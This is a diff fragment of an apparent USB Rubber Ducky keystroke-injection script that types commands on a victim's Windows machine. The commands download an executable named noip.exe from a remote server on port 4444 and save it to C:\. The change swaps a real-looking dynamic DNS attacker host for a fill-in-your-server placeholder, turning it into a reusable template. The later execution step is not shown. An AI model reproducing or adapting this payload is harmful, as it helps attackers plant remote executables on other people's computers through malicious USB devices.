@@ -7,7 +7,7 @@ STRING cd c:/
 DELAY 500
 ENTER
 DELAY 800
-STRING wget "http://xoot404.ddns.net:4444/noip.exe" -OutFile "C:\noip.exe"
+STRING wget "http://CHAGETHIStoYOUserver:4444/noip.exe" -OutFile "C:\noip.exe"
 DELAY 500
 ENTER
 DELAY 800
